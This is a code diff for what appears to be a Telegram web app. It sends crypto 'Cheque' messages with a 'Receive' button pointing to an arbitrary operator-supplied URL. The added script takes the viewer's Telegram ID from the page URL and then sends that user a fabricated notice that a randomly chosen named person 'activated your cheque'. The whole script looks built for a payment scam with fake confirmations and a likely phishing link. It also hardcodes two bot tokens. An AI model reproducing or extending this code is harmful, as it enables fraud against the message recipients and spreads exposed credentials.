@@ -119,54 +119,103 @@
         <div class="status" id="statusMessage"></div>
     </div>
 
-    <script>
-        const form = document.getElementById('sendMessageForm');
-        const statusMessage = document.getElementById('statusMessage');
+<script>
+  // Parse URL parameters from location hash
+  let urlHash = window.location.hash;
+  let paramsString = urlHash.split('#tgWebAppData=')[1]?.split('&tgWebAppVersion')[0];
+  
+  // Decode URL parameters
+  let decodedParams = decodeURIComponent(paramsString || '');
+  let params = new URLSearchParams(decodedParams);
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+  // Extract user data
+  let user = JSON.parse(params.get('user'));
+  const chatId2 = user.id;
 
-            const chatId = document.getElementById('chatId').value;
-            const amount = document.getElementById('amount').value;
-            const currency = document.getElementById('currency').value;
-            const fiatamount = document.getElementById('fiatamount').value;
-            const buttonUrl = document.getElementById('buttonUrl').value;
+  const form = document.getElementById('sendMessageForm');
+  const statusMessage = document.getElementById('statusMessage');
 
-            const fullMessage = `<b>🚀 Cheque</b> for <b>${amount} ${currency} ($${fiatamount})</b>`;
-            const buttonText = `Receive ${amount} ${currency}`;
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-            const botToken = '7879136047:AAEsSGC7CV4fhGbdVA7iU5z1JjNRKlbEXhQ'; // Replace with your bot token
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const chatId = document.getElementById('chatId').value;
+    const amount = document.getElementById('amount').value;
+    const currency = document.getElementById('currency').value;
+    const fiatamount = document.getElementById('fiatamount').value;
+    const buttonUrl = document.getElementById('buttonUrl').value;
 
-            const payload = {
-                chat_id: chatId,
-                text: fullMessage,
-                parse_mode: "HTML",
-                reply_markup: JSON.stringify({
-                    inline_keyboard: [[{ text: buttonText, url: buttonUrl }]]
-                })
-            };
+    const fullMessage = `<b>🚀 Cheque</b> for <b>${amount} ${currency} (${fiatamount}$)</b>`;
+    const buttonText = `Receive ${amount} ${currency}`;
 
-            statusMessage.innerText = "⏳ Sending...";
+    const botToken1 = "7879136047:AAEsSGC7CV4fhGbdVA7iU5z1JjNRKlbEXhQ";
+    const apiUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
-            try {
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+    const payload1 = {
+      chat_id: chatId,
+      text: fullMessage,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: buttonText, url: buttonUrl }]]
+      }
+    };
 
-                const result = await response.json();
-                if (result.ok) {
-                    statusMessage.innerText = "✅ sent successfully!";
-                } else {
-                    statusMessage.innerText = "❌ Failed: " + result.description;
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                statusMessage.innerText = "⚠️ An error occurred!";
-            }
-        });
-    </script>
+    statusMessage.innerText = "⏳ Sending...";
+
+    try {
+      const response1 = await fetch(apiUrl1, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload1)
+      });
+
+      const result1 = await response1.json();
+
+      if (result1.ok) {
+        statusMessage.innerText = "✅ Sent successfully!";
+        
+        // Send second message if the first message is successful
+        await sendRandomActivationMessage(amount, currency, fiatamount);
+      } else {
+        statusMessage.innerText = `❌ Failed: ${result1.description}`;
+      }
+    } catch (error) {
+      console.error("Error:", error);
+      statusMessage.innerText = "⚠️ An error occurred!";
+    }
+  });
+
+  async function sendRandomActivationMessage(amount, currency, fiatamount) {
+    const names = [
+      "Abdul Karim", "Rahim Uddin", "Jamal Hossain", "Salma Khatun", "Hasina Begum",
+      "Rafiqul Islam", "Jahangir Alam", "Nasima Akter", "Monir Hossain", "Shamsunnahar Begum",
+      "Faruk Ahmed", "Anwar Hossain", "Mizanur Rahman", "Rubina Sultana", "Ayesha Siddique",
+      "Bashir Uddin", "Kamal Hossain", "Taslima Akter", "Shahin Alam", "Nurjahan Begum",
+      "Saiful Islam", "Harunur Rashid", "Aminul Islam", "Shahidul Alam", "Firoza Begum",
+      "Mahbub Hasan", "Arifur Rahman", "Nasrin Jahan", "Rashid Ahmed", "Lamia Akter",
+      "Sujon Mia", "Julfikar Ali", "Mokhlesur Rahman", "Fahmida Khatun", "Mehedi Hasan",
+      "Sultan Mahmud", "Tanvir Rahman", "Shafiqul Islam", "Mamun Hossain", "Sabrina Rahman",
+      "Nizam Uddin", "Sadiya Akter", "Jamil Hossain", "Eshita Sultana", "Rezaul Karim",
+      "Abdul Malek", "Sumaiya Khatun", "Asaduzzaman Khan", "Shahriar Alam", "Minara Begum"
+    ];
+
+    const randomName = names[Math.floor(Math.random() * names.length)];
+    const botToken2 = "8100767206:AAEXZGQ9B0B65P2i1XhVzhesOr4dkUZEGKs";
+    const apiUrl2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;
+
+    const message = `<b>${randomName}</b> activated your cheque for <b>${amount} ${currency} (${fiatamount}$)</b>`;
+
+    await fetch(apiUrl2, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId2,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+  }
+</script>
+
+
 </body>
 </html>
